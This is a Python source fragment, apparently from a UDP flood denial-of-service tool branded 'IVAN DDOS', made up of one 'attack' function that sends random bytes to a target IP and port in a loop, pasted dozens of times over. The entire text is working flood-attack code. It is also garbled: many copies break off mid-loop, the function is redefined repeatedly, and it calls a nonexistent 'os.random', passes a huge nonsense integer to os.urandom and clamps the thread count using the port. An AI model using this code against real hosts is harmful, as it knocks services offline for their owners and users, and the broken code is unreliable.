
        sock.sendto(threads, (ip, port))

    print('\033[93m Tamat')
    os.system("clear")
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)
    
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)
        
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)
        
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)
        
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)
    
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)
        
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)
        
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)
        
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[93m Tamat')
    os.system("clear")
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[93m Tamat')
    os.system("clear")
   
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[93m Tamat')
    os.system("clear")
 
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS ★★★★")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[93m Tamat')
    os.system("clear")
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[93m Tamat')
    os.system("clear")
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[93m Tamat')
    os.system("clear")
   
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[93m Tamat')
    os.system("clear")
 
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS ★★★★")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[93m Tamat')
    os.system("clear")
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[93m Tamat')
    os.system("clear")
 
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS ★★★★")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[93m Tamat')
    os.system("clear")
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)
    
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)
        
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)
        
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)
        
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)
    
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)
        
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)
        
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)
        
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
